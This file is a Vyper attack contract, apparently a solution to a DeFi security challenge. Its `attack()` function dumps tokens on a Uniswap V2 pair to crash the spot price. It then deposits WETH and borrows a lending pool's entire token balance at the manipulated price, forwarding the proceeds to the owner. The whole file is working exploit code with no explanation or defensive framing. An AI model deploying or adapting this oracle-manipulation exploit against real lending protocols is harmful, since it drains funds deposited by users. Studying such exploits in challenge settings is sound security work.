# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IUniswapV2Router:
    def swapExactTokensForETH(
        amountIn: uint256,
        amountOutMin: uint256,
        path: DynArray[address, 2],
        to: address,
        deadline: uint256,
    ) -> DynArray[uint256, 2]: nonpayable

interface IPool:
    def calculateDepositOfWETHRequired(
        tokenAmount: uint256        
    ) -> uint256: view
    def borrow(borrowAmount: uint256): nonpayable

owner: immutable(address)

token: IERC20
router: IUniswapV2Router
pool: IPool

weth: address

@external
@payable
def __init__(
    _token: IERC20, 
    _router: IUniswapV2Router, 
    _pool: IPool,
    _weth: address, 
):
    assert msg.value > as_wei_value(19, "ether"), "send ETH"
    owner = msg.sender
    self.token = _token
    self.router = _router
    self.pool = _pool
    self.weth = _weth

@external
def attack():
    assert msg.sender == owner, "!owner"
    deadline: uint256 = block.timestamp * 2
    initial_balance: uint256 = self.token.balanceOf(self)
    pool_balance: uint256 = self.token.balanceOf(self.pool.address)
    path: DynArray[address, 2] = [self.token.address, self.weth]
    
    self.token.approve(self.router.address, initial_balance)

    self.router.swapExactTokensForETH(
        initial_balance,
        empty(uint256),
        path,
        self,
        deadline,
    )
    self._borrow_from_pool(pool_balance)

    self.token.transfer(
        msg.sender, 
        self.token.balanceOf(self),
    )
    send(msg.sender, self.balance)
    
@internal
def _borrow_from_pool(tokens_to_swap: uint256):
    required_eth: uint256 = self.pool.calculateDepositOfWETHRequired(
        tokens_to_swap
    )
    assert self.balance >= required_eth, "need more eth"
    IERC20(self.weth).approve(self.pool.address, required_eth)
    raw_call(self.weth, b"", value=required_eth)
    self.pool.borrow(tokens_to_swap)

@external
@payable
def __default__():
    pass
